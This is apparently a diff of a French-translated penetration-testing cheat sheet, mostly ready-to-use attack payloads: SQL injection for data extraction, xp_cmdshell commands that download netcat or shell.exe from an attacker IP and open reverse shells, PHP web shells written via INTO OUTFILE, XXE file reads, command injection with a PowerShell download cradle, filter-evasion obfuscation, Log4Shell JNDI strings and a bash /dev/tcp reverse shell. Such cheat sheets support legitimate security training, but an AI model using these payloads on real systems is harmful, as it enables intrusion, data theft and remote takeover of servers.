 http://<site>/report.php?id=-23' UNION SELECT 1, 2, TABLE_NAME, 4, 5 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_CATALOG = DB_NAME(); -- -
+
 ```
 
 
@@ -2080,6 +2222,7 @@ http://<site>/report.php?id=-23' UNION SELECT 1, 2, column_name, 4, 5 FROM infor
 
 # MSSQL
 http://<site>/report.php?id=-23' UNION SELECT 1, 2, COLUMN_NAME, 4, 5 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='<tablename>'; -- -
+
 ```
 
 
@@ -2092,6 +2235,7 @@ http://<site>/report.php?id=-23' UNION SELECT 1, 2, COLUMN_NAME, 4, 5 FROM INFOR
 %' UNION SELECT database(), user(), @@version, null, null -- -
 # or
 ' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- -
+
 ```
 
 
@@ -2103,18 +2247,21 @@ http://<site>/report.php?id=-23' UNION SELECT 1, 2, CONCAT(column1, column2), 4,
 
 # MSSQL
 http://<site>/report.php?id=-23' UNION SELECT 1, 2, column1 + column2, 4, 5 FROM <tablename> -- -
+
 ```
 
 
 ```bash
 # MySQL & MSSQL
 http://website.com/index.php?id=1 ORDER BY <number> -- -
+
 ```
 
 
 ```bash
 # MySQL & MSSQL
 http://website.com/index.php?id=-1 UNION SELECT <number of columns separated by commas> -- -
+
 ```
 
 
@@ -2124,6 +2271,7 @@ http://website.com/index.php?id=-1' UNION SELECT <column1>, <column2> FROM <tabl
 
 # MSSQL
 http://website.com/index.php?id=-1' UNION SELECT <column1>, <column2> FROM <table_name> EXEC xp_cmdshell 'echo <data> > <filename>'
+
 ```
 
 
@@ -2133,6 +2281,7 @@ http://website.com/index.php?id=-1' UNION SELECT 1, 2, @@version, 4, 5 -- -
 
 # MSSQL
 http://website.com/index.php?id=-1' UNION SELECT 1, 2, @@VERSION, 4, 5 -- -
+
 ```
 
 
@@ -2142,6 +2291,7 @@ http://website.com/index.php?id=-1' UNION SELECT 1, 2, USER(), 4, 5 -- -
 
 # MSSQL
 http://website.com/index.php?id=-1' UNION SELECT 1, 2, SUSER_SNAME(), 4, 5 -- -
+
 ```
 
 
@@ -2151,6 +2301,7 @@ http://website.com/index.php?id=-1' UNION SELECT 1, 2, @@datadir, 4, 5 -- -
 
 # MSSQL
 http://website.com/index.php?id=-1' UNION SELECT 1, 2, SERVERPROPERTY('InstanceName'), 4, 5 -- -
+
 ```
 
 
@@ -2160,6 +2311,7 @@ http://website.com/index.php?id=-1' UNION SELECT 1, 2, GROUP_CONCAT(table_name),
 
 # MSSQL
 http://website.com/index.php?id=-1' UNION SELECT 1, 2, STRING_AGG(TABLE_NAME, ','), 4, 5 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_CATALOG = DB_NAME(); -- -
+
 ```
 
 
@@ -2169,6 +2321,7 @@ http://website.com/index.php?id=-1' UNION SELECT 1, 2, GROUP_CONCAT(column_name)
 
 # MSSQL
 http://website.com/index.php?id=-1' UNION SELECT 1, 2, STRING_AGG(COLUMN_NAME, ','), 4, 5 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='<tablename>'; -- -
+
 ```
 
 
@@ -2178,6 +2331,7 @@ http://website.com/index.php?id=-1' UNION SELECT 1, 2, GROUP_CONCAT(<column_name
 
 # MSSQL
 http://website.com/index.php?id=-1' UNION SELECT 1, 2, STRING_AGG(<column_name>, ','), 4, 5 FROM <table_name>; -- -
+
 ```
 
 
@@ -2190,6 +2344,7 @@ http://website.com/index.php?id=-1' UNION SELECT 1, 2, STRING_AGG(<column_name>,
 ```bash
 # MySQL & MSSQL
 http://website.com/index.php?id=1' <SQL_injection_here> AND '1' -- -
+
 ```
 
 
@@ -2200,6 +2355,7 @@ http://website.com/index.php?id=1' <SQL_injection_here> AND '1' -- -
 
 ```sql
 http://<host>/vulnerable-page?param=<input>' OR '1'='1 --+
+
 ```
 
 
@@ -2209,10 +2365,11 @@ http://<host>/vulnerable-page?param=<input>' AND 1=1 --+
 http://<host>/vulnerable-page?param=<input>' AND '1'='1 --+
 
 http://<host>/vulnerable-page?param=<input>' AND '1'='2 --+
+
 ```
 
 
-##### Extracting Database Information
+##### Extraire les informations de la base
 
 
 **Paramètres et repères :**
@@ -2227,6 +2384,7 @@ http://<host>/vulnerable-page?param=<input>' AND (SELECT SUBSTRING(@@version,1,1
 
 # MSSQL
 http://<host>/vulnerable-page?param=<input>' AND (SELECT SUBSTRING(@@version,1,1)='5') --+
+
 ```
 
 
@@ -2242,6 +2400,7 @@ http://<host>/vulnerable-page?param=<input>' AND IF(SUBSTRING(database(),1,1)='a
 
 # MSSQL
 http://<host>/vulnerable-page?param=<input>' AND IIF(SUBSTRING(DB_NAME(),1,1)='a', WAITFOR DELAY '00:00:05', 0) --+
+
 ```
 
 
@@ -2256,6 +2415,7 @@ http://<host>/vulnerable-page?param=<input>' AND (SELECT COUNT(*) FROM informati
 
 # MSSQL
 http://<host>/vulnerable-page?param=<input>' AND (SELECT COUNT(*) FROM sys.tables) > 5 --+
+
 ```
 
 
@@ -2265,6 +2425,7 @@ http://<host>/vulnerable-page?param=<input>' AND (SELECT COUNT(*) FROM informati
 
 # MSSQL
 http://<host>/vulnerable-page?param=<input>' AND (SELECT COUNT(*) FROM sys.columns WHERE object_id = OBJECT_ID('users')) > 5 --+
+
 ```
 
 
@@ -2283,6 +2444,7 @@ http://<host>/vulnerable-page?param=<input>' AND (SELECT SUBSTRING(username,1,1)
 
 # MSSQL
 http://<host>/vulnerable-page?param=<input>' AND (SELECT TOP 1 SUBSTRING(username,1,1) FROM users)='a' --+
+
 ```
 
 
@@ -2291,6 +2453,7 @@ http://<host>/vulnerable-page?param=<input>' AND (SELECT TOP 1 SUBSTRING(usernam
 ```sql
 admin' AND SUBSTRING(username,1,1)='a' --+   # MySQL
 admin' AND SUBSTRING(username,1,1)='a' --+   # MSSQL
+
 ```
 
 
@@ -2309,6 +2472,7 @@ http://<host>/index.php?id=1' AND (SUBSTRING(database(), <offset>, <character_le
 
 # MSSQL
 http://<host>/index.php?id=1' AND (SUBSTRING(DB_NAME(), <offset>, <character_length>))='<character>' --+
+
 ```
 
 
@@ -2323,6 +2487,7 @@ admin' OR SLEEP(5);--+
 
 # MSSQL
 admin' OR WAITFOR DELAY '00:00:05';--+
+
 ```
 
 
@@ -2334,6 +2499,7 @@ http://<host>/login.php?user=admin' AND IF(1=1, SLEEP(5), 0) --+
 
 # MSSQL
 http://<host>/login.php?user=admin' AND IIF(1=1, WAITFOR DELAY '00:00:05', 0) --+
+
 ```
 
 
@@ -2343,6 +2509,7 @@ http://<host>/index.php?id=1' AND SLEEP(10) --+
 
 # MSSQL
 http://<host>/index.php?id=1' AND WAITFOR DELAY '00:00:10' --+
+
 ```
 
 
@@ -2352,6 +2519,7 @@ http://<host>/index.php?id=1' AND IF((SELECT VERSION()) LIKE '5%', SLEEP(10), NU
 
 # MSSQL
 http://<host>/index.php?id=1' AND IIF((SELECT @@VERSION) LIKE '5%', WAITFOR DELAY '00:00:10', NULL) --+
+
 ```
 
 
@@ -2370,6 +2538,7 @@ done > <filename.txt> && grep "0m9" <filename.txt
 # Remplacer <filename.txt> par le nom du fichier pour stocker les résultats.
 # Remplacer 10 en $(seq 1 10) par la longueur estimée du nom de la base de données.
 # Le mot clé FUZZ est utilisé par wfuzz pour itérer à travers les valeurs ASCII.
+
 ```
 
 
@@ -2387,6 +2556,7 @@ done > <filename.txt> && grep "0m9" <filename.txt
 
 # Remplacer table_name et table_schema par les noms réels des tables et bases ciblées.
 # Modifier le premier argument de LIMIT 0,1 pour parcourir plusieurs tables.
+
 ```
 
 
@@ -2404,6 +2574,7 @@ done > <filename.txt> && grep "0m9" <filename.txt
 
 # Remplacer <table_name> par le nom de la table que vous ciblez.
 # Adjust LIMIT 0,1 to retrieve column names for different tables.
+
 ```
 
 
@@ -2422,6 +2593,7 @@ done > <filename.txt> && grep "0m9" <filename.txt
 # Remplacer <column_name> par la colonne que vous essayez d'extraire (par exemple, nom d'utilisateur, mot de passe).
 # Remplacer <table_name> par le nom de la table.
 # La valeur FUZZ itère sur des entrées de lignes possibles (utilisez LIMIT FUZZ, 1 pour itérer des lignes).
+
 ```
 
 ![Blind SQL Injection with Tools](https://www.emmanuelsolis.com/img/automating_blind_sqli.gif)
@@ -2433,7 +2605,7 @@ done > <filename.txt> && grep "0m9" <filename.txt
 <p class="oscp-command-note">Lire les résultats d&#x27;une requête SQL.</p>
 
 ```sql
--- Standard OR-based bypass
+-- Variante utilisant une condition OR
 ' OR 1=1 --+
 
 -- Bypass with LIMIT (useful when multiple entries might be returned)
@@ -2442,7 +2614,7 @@ done > <filename.txt> && grep "0m9" <filename.txt
 -- Bypass by using string comparison (a common trick when numeric bypass fails)
 ' OR 'a'='a --+
 
--- Using AND to combine conditions and exploit certain scenarios
+-- Combiner plusieurs conditions avec AND
 ' OR 3=3 --+
 
 -- More obfuscated example (avoiding use of typical 1=1):
@@ -2457,8 +2629,9 @@ done > <filename.txt> && grep "0m9" <filename.txt
 -- Bypass with LIMIT for MySQL (restricts to 1 entry)
 ' OR 1=1 LIMIT 1 --+
 
--- MSSQL version of limiting output with TOP
+-- Limiter les résultats MSSQL avec TOP
 ' OR 1=1; SELECT TOP 1 * FROM users --+
+
 ```
 
 
@@ -2469,6 +2642,7 @@ meh' OR 3=3;#
 meh' OR 2=2 LIMIT 1;#
 meh' OR 'a'='a
 meh' OR 1=1 --+
+
 ```
 
 
@@ -2477,6 +2651,7 @@ meh' OR 3=3;--
 meh' OR 2=2;--
 meh' OR 'a'='a;--
 meh' OR 1=1;--
+
 ```
 
 
@@ -2500,6 +2675,7 @@ if($row) {
     echo "Invalid username or password";
 }
 ?>
+
 ```
 
 
@@ -2512,11 +2688,13 @@ Examiner les connexions, la configuration et les requêtes de la base de donnée
 
 ```text
 'admin'
+
 ```
 
 
 ```text
 'admin'
+
 ```
 
 
@@ -2531,6 +2709,7 @@ username=admin++++++++&password=testpwn123
 
 -- The database truncates the input to admin and discards the extra characters
 -- If a user admin already exists, the attacker might be able to bypass authentication.
+
 ```
 
 
@@ -2554,11 +2733,13 @@ Examiner les connexions, la configuration et les requêtes de la base de donnée
 
 ```sql
 SELECT name FROM master.dbo.sysdatabases
+
 ```
 
 
 ```sql
 SELECT table_name FROM <DATABASE>.INFORMATION_SCHEMA.TABLES
+
 ```
 
 
@@ -2566,11 +2747,13 @@ SELECT table_name FROM <DATABASE>.INFORMATION_SCHEMA.TABLES
 
 ```sql
 union select 1,(select string_agg(concat(name,':',id),'|') from streamio..sysobjects where xtype='u'),3,4,5,6-- -
+
 ```
 
 
 ```sql
 union select 1,concat(username,':',password),3,4,5,6 from users--
+
 ```
 
 
@@ -2584,21 +2767,23 @@ union select 1,concat(username,':',password),3,4,5,6 from users--
 exec xp_dirtree 'c:\'
 
 EXEC xp_cmdshell 'ping [attacker_ip]';
+
 ```
 
 
 
 
 ```sql
--- Attacker
+-- Côté testeur
 sudo responder -A -I tun0
 
--- Target
+-- Côté cible
 EXEC master..xp_dirtree '\\[Attacker_IP]\share\'
+
 ```
 
 
-##### Statement Examples
+##### Exemples d'instructions SQL
 
 
 <p class="oscp-command-note">Lire les résultats d&#x27;une requête SQL.</p>
@@ -2611,11 +2796,12 @@ INSERT INTO dbo.tablename ('<user_input>', '<user_input>');
 INSERT INTO dbo.tablename ('1 AND 1=CONVERT(INT,@@version))-- ', '<user_input>'); 
 INSERT INTO dbo.tablename('', CONVERT(INT, db_name(<number>)))-- 
 
--- Enumerate column names
+-- Énumérer les noms des colonnes
 ', CONVERT(INT, (CHAR(58)+(SELECT DISTINCT TOP 1 column_name FROM information_schema.COLUMNS WHERE TABLE_NAME='<table_name>' ORDER BY column_name ASC)+CHAR(58))))-- 
 
--- Enumerate data in columns
+-- Lire les données des colonnes
 ', CONVERT(INT, (CHAR(58)+CHAR(58)+(SELECT TOP 1 <column> FROM <table_name> ORDER BY <column> ASC)+CHAR(58)+CHAR(58))))-- 
+
 ```
 
 
@@ -2627,47 +2813,50 @@ INSERT INTO dbo.tablename('', CONVERT(INT, db_name(<number>)))--
 ```sql
 -- Use this if you are doing SQL Injection.
 
--- Enable advanced options
+-- Activer les options avancées
 ';EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;-- 
 
--- Enable command shell
+-- Activer xp_cmdshell
 ';EXEC xp_cmdshell "powershell wget http://[kali_ip]/nc64.exe -o C:\Users\Public\nc64.exe";--
 
--- Execute commands
+-- Exécuter la commande indiquée
 ';EXEC xp_cmdshell "C:\Users\Public\nc64.exe -t -e C:\Windows\System32\cmd.exe [kali_ip] [listening_port]";--
+
 ```
 
 
 ```sql
 -- Use this if you have direct access to execute SQL statements.
 
--- Enable advanced options
+-- Activer les options avancées
 EXEC sp_configure 'show advanced options',1;
 RECONFIGURE;
 
--- Enable command shell
+-- Activer xp_cmdshell
 EXEC sp_configure 'xp_cmdshell',1
 RECONFIGURE;
 
--- Execute commands
+-- Exécuter la commande indiquée
 EXEC xp_cmdshell "powershell wget http://[kali_ip]/nc64.exe -o C:\Users\Public\nc64.exe";
 EXEC xp_cmdshell "C:\Users\Public\nc64.exe -t -e C:\Windows\System32\cmd.exe [kali_ip] [listening_port]";
+
 ```
 
 
 ```sql
 -- Exploitation Example.
 
--- Enable advanced options
+-- Activer les options avancées
 <username>'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; --
 
--- Enable command shell
+-- Activer xp_cmdshell
 <username>'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --
 
--- Execute commands
+-- Exécuter la commande indiquée
 <username>'; EXEC master.dbo.xp_cmdshell 'ping <attacker_ip>'; --
 <username>'; EXEC master.dbo.xp_cmdshell 'certutil -urlcache -split -f http://<attacker_ip>:<port>/shell.exe C:\\Windows\\temp\\shell.exe'; --
 <username>'; EXEC master.dbo.xp_cmdshell 'cmd /c C:\\Windows\\temp\\shell.exe'; --
+
 ```
 
 
@@ -2678,6 +2867,7 @@ EXEC xp_cmdshell "C:\Users\Public\nc64.exe -t -e C:\Windows\System32\cmd.exe [ka
 
 ```sql
 SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
+
 ```
 
 
@@ -2685,6 +2875,7 @@ SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_princ
 
 ```sql
 EXECUTE AS LOGIN = 'sa' SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER('sysadmin')
+
 ```
 
 
@@ -2696,11 +2887,13 @@ SELECT SYSTEM_USER
 SELECT IS_SRVROLEMEMBER('sysadmin')
 
 go
+
 ```
 
 
 ```sql
 SELECT srvname, isremote FROM sysservers;
+
 ```
 
 
@@ -2714,6 +2907,7 @@ SELECT srvname, isremote FROM sysservers;
 EXEC master.dbo.sp_configure 'show advanced options', 1;
 
 RECONFIGURE;
+
 ```
 
 
@@ -2736,6 +2930,7 @@ Examiner les connexions, la configuration et les requêtes de la base de donnée
 
 ```bash
 mysql -u <username> -p'<password>' -h <host> -P <port>
+
 ```
 
 
@@ -2745,6 +2940,7 @@ mysql -u <username> -p'<password>' -h <host> -P <port>
 SHOW DATABASES;
 
 USE <database_name>;
+
 ```
 
 
@@ -2754,6 +2950,7 @@ SHOW TABLES;
 DESCRIBE <table_name>;
 
 SELECT * FROM <table_name>;
+
 ```
 
 
@@ -2763,33 +2960,35 @@ SELECT * FROM <table_name>;
 SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
 -- or, using the ?cmd=[command] format
 SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoor.php"
+
 ```
 
 
 
 
 ```sql
--- Check MySQL version
+-- Vérifier la version MySQL
 SELECT version();
 
--- Get system user
+-- Identifier l'utilisateur SQL courant
 SELECT system_user();
 
--- List databases
+-- Lister les bases de données
 SHOW DATABASES;
 
 -- List users and their passwords (authentication_string)
 SELECT user, authentication_string FROM mysql.user WHERE user = '<username>';
 
--- Database User Enumeration
+-- Énumérer les comptes de la base
 SELECT user FROM mysql.user;
 
--- Privilege Escalation
+-- Élévation de privilèges
 GRANT ALL PRIVILEGES ON *.* TO '<username>'@'%' WITH GRANT OPTION;
 FLUSH PRIVILEGES;
 
 # Tester SQLi dans chaque champ d'entrée
 ';#---
+
 ```
 
 
@@ -2806,11 +3005,12 @@ FLUSH PRIVILEGES;
 -- General payload
 SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE "/var/www/html/webshell.php"
 
--- Using UNION
+-- Variante utilisant UNION
 ' union select '<?php system($_GET["cmd"]); ?>' into outfile '/srv/http/shell.php' -- -
 
 -- Windows Payload
 SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE "C:/wamp/www/shell.php" 
+
 ```
 
 
@@ -2821,6 +3021,7 @@ SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE "C:/wamp/www/shell.php"
 
 ```sql
 admin ' OR 1=1 -- 
+
 ```
 
 
@@ -2828,6 +3029,7 @@ admin ' OR 1=1 --
 
 ```sql
 1' OR 1 = 1 #
+
 ```
 
 
@@ -2835,17 +3037,20 @@ admin ' OR 1=1 --
 
 ```sql
 ' UNION SELECT 1,2,3,4 FROM information_schema.tables WHERE table_schema=database()-- 
+
 ```
 
 
 ```sql
 ' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database()-- 
 ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='<table_name>'-- 
+
 ```
 
 
 ```sql
 ' UNION SELECT <column1>, <column2> FROM <table_name>-- 
+
 ```
 
 
@@ -2860,27 +3065,32 @@ admin ' OR 1=1 --
 
 ```sql
 ' UNION SELECT 1,2,3,4,5 FROM dual-- 
+
 ```
 
 
 ```sql
 ' UNION SELECT 1,2,3 FROM dual-- 
+
 ```
 
 
 ```sql
 ' UNION SELECT username, NULL, NULL FROM all_users-- 
+
 ```
 
 
 ```sql
 ' UNION SELECT table_name, NULL, NULL FROM all_tables-- 
 ' UNION SELECT column_name, NULL, NULL FROM all_tab_columns WHERE table_name='<table_name>'-- 
+
 ```
 
 
 ```sql
 ' UNION SELECT <column_name>, NULL FROM <table_name>-- 
+
 ```
 
 
@@ -2891,6 +3101,7 @@ admin ' OR 1=1 --
 
 ```sql
 admin ' OR 1=1 -- 
+
 ```
 
 
@@ -2914,6 +3125,7 @@ Examiner les entrées et les réponses de l'application web.
 
 ```text
 <date>
+
 ```
 
 
@@ -2924,6 +3136,7 @@ Examiner les entrées et les réponses de l'application web.
 
 ```text
 &lt;
+
 ```
 
 
@@ -2934,6 +3147,7 @@ Examiner les entrées et les réponses de l'application web.
 
 ```text
 <date>01-01-2022</date>
+
 ```
 
 
@@ -2944,6 +3158,7 @@ Examiner les entrées et les réponses de l'application web.
 
 ```text
 version="1.0"/encoding="UTF-8"
+
 ```
 
 
@@ -2954,6 +3169,7 @@ version="1.0"/encoding="UTF-8"
 
 ```text
 <?xml version="1.0" encoding="UTF-8"?>
+
 ```
 
 
@@ -2964,6 +3180,7 @@ version="1.0"/encoding="UTF-8"
 
 ```text
 &[variable];
+
 ```
 
 ![XEE Payload](https://www.emmanuelsolis.com/img/xee01.png)
@@ -2988,6 +3205,7 @@ version="1.0"/encoding="UTF-8"
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
 <foo>&xxe;</foo>
+
 ```
 
 
@@ -2997,6 +3215,7 @@ version="1.0"/encoding="UTF-8"
    <!ELEMENT config ANY >
    <!ENTITY readConfig SYSTEM "file:///etc/myconfig.conf" >]>
 <config>&readConfig;</config>
+
 ```
 
 
@@ -3006,6 +3225,7 @@ version="1.0"/encoding="UTF-8"
    <!ELEMENT data ANY >
    <!ENTITY localHosts SYSTEM "file:///etc/hosts" >]>
 <data>&localHosts;</data>
+
 ```
 
 
@@ -3018,6 +3238,7 @@ version="1.0"/encoding="UTF-8"
    %all;
 ]>
 <request>&send;</request>
+
 ```
 
 
@@ -3027,6 +3248,7 @@ version="1.0"/encoding="UTF-8"
    <!ELEMENT request ANY >
    <!ENTITY xxe SYSTEM "http://attacker.com/secret.txt" >]>
 <request>&xxe;</request>
+
 ```
 
 
@@ -3037,6 +3259,7 @@ version="1.0"/encoding="UTF-8"
 
 ```text
 | < > { } &
+
 ```
 
 
@@ -3044,6 +3267,7 @@ version="1.0"/encoding="UTF-8"
 <!DOCTYPE email [
   <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
 ]>
+
 ```
 
 ![XEE Reading Source Code](https://www.emmanuelsolis.com/img/xee04.png)
@@ -3056,6 +3280,7 @@ version="1.0"/encoding="UTF-8"
 
 ```text
 | < > { } &
+
 ```
 
 
@@ -3070,6 +3295,7 @@ version="1.0"/encoding="UTF-8"
 <email>&company;</email>
 <message></message>
 </root>
+
 ```
 
 
@@ -3086,6 +3312,7 @@ version="1.0"/encoding="UTF-8"
 # UID=2
 /documents/Invoice_2_08_2020.pdf
 /documents/Report_2_12_2020.pdf
+
 ```
 
 
@@ -3102,6 +3329,7 @@ for i in {1..10}; do
                 wget -q $url/$link
         done
 done
+
 ```
 
 
@@ -3116,6 +3344,7 @@ for i in {1..20}; do
         curl -O $url/$link
     done
 done
+
 ```
 
 
@@ -3137,6 +3366,7 @@ function changeUserPassword() {
         }
     });
 }
+
 ```
 
 
@@ -3149,11 +3379,13 @@ Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
 ```text
 download.php?filename=ZmlsZV8xMjMucGRm
+
 ```
 
 
 ```text
 download.php?filename=c81e728d9d4c2f636f067f89cc14862c
+
 ```
 
 
@@ -3169,6 +3401,7 @@ $.ajax({
         //
     }
 });
+
 ```
 
 
@@ -3191,6 +3424,7 @@ $.ajax({
   "Id" : "1",
   "Name" : "User1"
 }
+
 ```
 
 
@@ -3208,6 +3442,7 @@ $.ajax({
     "email": "emma@employees.com",
     "about": "A pentester and red teamer."
 }
+
 ```
 
 
@@ -3224,6 +3459,7 @@ Examiner les entrées et les réponses de l'application web.
 ```powershell
 # Vérifiez si nous effectuons PowerShell ou CMD
 (dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
+
 ```
 
 
@@ -3237,6 +3473,7 @@ if (isset($_GET['filename'])) {
 app.get("/createfile", function(req, res){
     child_process.exec(`touch /tmp/${req.query.filename}.txt`);
 })
+
 ```
 
 
@@ -3244,6 +3481,7 @@ app.get("/createfile", function(req, res){
 
 ```bash
 curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F<ATTACKER_IP>%2Fpowercat.ps1%22)%3Bpowercat%20-c%20<ATTACKER_IP>%20-p%20<PORT>%20-e%20powershell' http://<TARGET>:<PORT>/archive
+
 ```
 
 
@@ -3254,6 +3492,7 @@ curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).Dow
 
 ```text
 ;
+
 ```
 
 
@@ -3264,11 +3503,13 @@ curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).Dow
 
 ```text
 ;
+
 ```
 
 
 ```text
 %3b
+
 ```
 
 
@@ -3279,6 +3520,7 @@ curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).Dow
 
 ```text
 %0a
+
 ```
 
 
@@ -3289,11 +3531,13 @@ curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).Dow
 
 ```text
 &
+
 ```
 
 
 ```text
 %26
+
 ```
 
 
@@ -3304,11 +3548,13 @@ curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).Dow
 
 ```text
 |
+
 ```
 
 
 ```text
 %7c
+
 ```
 
 
@@ -3319,11 +3565,13 @@ curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).Dow
 
 ```text
 &&
+
 ```
 
 
 ```text
 %26%26
+
 ```
 
 
@@ -3334,11 +3582,13 @@ curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).Dow
 
 ```text
 |
+
 ```
 
 
 ```text
 %7c%7c
+
 ```
 
 
@@ -3349,6 +3599,7 @@ curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).Dow
 
 ```text
 %60%60
+
 ```
 
 
@@ -3359,11 +3610,13 @@ curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).Dow
 
 ```text
 $()
+
 ```
 
 
 ```text
 %24%28%29
+
 ```
 
 
@@ -3374,16 +3627,19 @@ $()
 
 ```text
 %09
+
 ```
 
 
 ```text
 $IFS
+
 ```
 
 
 ```json
 {ls,-la}
+
 ```
 
 
@@ -3395,6 +3651,7 @@ $IFS
 ```bash
 # pour sélectionner /
 echo ${PATH:0:1}
+
 ```
 
 
@@ -3403,6 +3660,7 @@ echo ${PATH:0:1}
 ```powershell
 # pour sélectionner \
 $env:HOMEPATH[0]
+
 ```
 
 
@@ -3418,6 +3676,7 @@ foreach ($blacklist as $word) {
         echo "Invalid input";
     }
 }
+
 ```
 
 
@@ -3425,16 +3684,19 @@ foreach ($blacklist as $word) {
 ` or "
 
 Example: w'h'o'am'i
+
 ```
 
 
 ```text
 \
+
 ```
 
 
 ```text
 $@
+
 ```
 
 
@@ -3444,6 +3706,7 @@ $@
 Examples:
 - who$@ami
 - w\ho\am\i
+
 ```
 
 
@@ -3451,6 +3714,7 @@ Examples:
 
 ```text
 ^
+
 ```
 
 
@@ -3459,6 +3723,7 @@ Examples:
 ```text
 Example:
 - who^ami
+
 ```
 
 
@@ -3473,6 +3738,7 @@ echo 'whoami' | rev
 
 # Pour exécuter :
 $(rev<<<'imaohw')
+
 ```
 
 
@@ -3484,6 +3750,7 @@ $(rev<<<'imaohw')
 
 # Pour exécuter :
 iex "$('imaohw'[-1..-20] -join '')"
+
 ```
 
 
@@ -3498,6 +3765,7 @@ echo -n 'cat /etc/passwd | grep 33' | base64
 
 # Pour exécuter (notez que nous utilisons <<< pour éviter l'utilisation d'un tube, qui est un caractère filtré):
 bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
+
 ```
 
 
@@ -3508,6 +3776,7 @@ bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
 
 # Pour exécuter :
 iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))
+
 ```
 
 
@@ -3530,6 +3799,7 @@ cd ./bashfuscator/bin/
 
 # Exemple
 ./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
+
 ```
 
 
@@ -3545,6 +3815,7 @@ Invoke-DOSfuscation> SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
 
 Invoke-DOSfuscation> encoding
 Invoke-DOSfuscation\Encoding> 1
+
 ```
 
 
@@ -3559,6 +3830,7 @@ ${jndi:ldap://attacker-server.com:1389/a}
 
 # RMI Payload
 ${jndi:rmi://attacker-server.com:1099/a}
+
 ```
 
 
@@ -3573,6 +3845,7 @@ curl -X GET http://target-server.com -H "User-Agent: ${jndi:ldap://attacker-serv
 
 # Utilisation de l'injection de données POST
 curl -X POST http://target-server.com/login -d "username=${jndi:ldap://attacker-server.com:1389/a}&password=test"
+
 ```
 
 
@@ -3580,6 +3853,7 @@ curl -X POST http://target-server.com/login -d "username=${jndi:ldap://attacker-
 
 ```bash
 nc -lvnp [listening_port]
+
 ```
 
 
@@ -3593,6 +3867,7 @@ bash -i >& /dev/tcp/attacker-server.com/[listening_port] 0>&1
 
 # Utiliser la charge utile du shell inverse
 ${jndi:ldap://attacker-server.com:1389/bash-reverse-shell}
+
 ```
 
 
@@ -3612,6 +3887,7 @@ CVE-2009-4623 https://www.exploit-db.com/exploits/9623  Advanced comment system1
 https://github.com/hupe1980/CVE-2009-4623/blob/main/exploit.py
 
 CVE-2018-18619 https://www.exploit-db.com/exploits/45853 Advanced Comment System 1.0 - SQL Injection
+
 ```
 
 ---
